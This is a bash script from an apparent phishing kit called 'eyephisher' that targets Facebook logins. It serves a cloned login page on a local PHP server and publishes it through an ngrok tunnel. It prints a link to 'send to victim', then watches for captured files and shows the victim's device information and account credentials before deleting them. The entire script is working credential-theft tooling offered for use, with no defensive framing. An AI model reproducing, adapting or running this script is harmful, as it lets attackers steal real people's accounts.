#---------colors
r='\e[1;31m'
g='\e[1;32m'
y='\e[1;33m'
b='\e[1;34m'
p='\e[1;35m'
c='\e[1;36m'
w='\e[1;37m'


#---------get victim cred
get_cred() {
	echo 
	echo -e " $r[$w~$r]$y Waiting for Login Info...\e[0m\n"
	while [ true ]; do
	if [[ -e "$HOME/eyephisher/sites/facebook/info.sh" ]]; then
		echo
		echo -e " $r[$w~$r]$g Victim Credentials Found!!! $w"
	sleep 3
		echo
		echo -e " $r[$w~$r]$c Victim Device Info: $w" && cd $HOME/eyephisher/sites/facebook/
		echo
		sleep 2
		bash info.sh
		echo
		sleep 4
		echo -e " $r[$w~$r]$c Victim Acc Credentials: $w"
		echo
		sleep 2
		bash logs.sh
		echo
	sleep 2
		cd $HOME/eyephisher/sites/facebook/
		rm -rf info.sh
		rm -rf logs.sh
	sleep 1
		echo
		echo -e " $r[$w~$r]$g All Done Thanks For Using Us"
		echo -e " $r[$w~$r]$g Click$y CTRL + C$g to exit "
	fi
done
}


#---------server starter
echo
echo -e " $r[$w~$r]$g Starting Attack Please Wait..."
cd $HOME/eyephisher/sites/facebook/ && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 8
echo -e " $r[$w~$r]$g Starting Server Please Wait..."
cd $HOME/eyephisher &&
./ngrok http 3333 > /dev/null 2>&1 &
sleep 15
echo
url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
echo -e " $r[$w~$r]$c Send This Link To Victim:$w $url"
echo 
echo -e " $r[$w~$r]$g To Stop the Attack click:$y CTRL + C"
get_cred
